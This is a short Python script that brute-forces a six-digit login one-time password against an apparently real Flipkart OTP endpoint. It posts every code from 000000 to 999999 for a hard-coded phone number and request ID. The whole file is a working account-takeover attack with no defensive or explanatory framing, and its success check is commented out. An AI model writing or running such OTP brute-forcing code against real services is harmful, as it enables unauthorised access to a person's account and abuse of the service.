import requests
import json

URL = "https://1.rome.api.flipkart.com/api/1/user/login/otp"

for a in range(0,10):
    for b in range(0,10):
        for c in range(0,10):
            for d in range(0,10):
                for e in range(0,10):
                    for f in range(0,10):
                        #print(str(a)+str(b)+str(c)+str(d)+str(e)+str(f))
                        data = {
                            "userId": "+919042831738",
                            "requestId": "A6DD0F0AC7C542038141039FB516EE29R",
                            "otp": str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
                            }

                        req = requests.post(URL, json=data)

                        #dada = json.loads(req.text)
                        print("STATUS--->",req)
                        # if dada.get("status"):
                        #     print("RES--->,",str(a)+str(b)+str(c)+str(d))
                        #     break
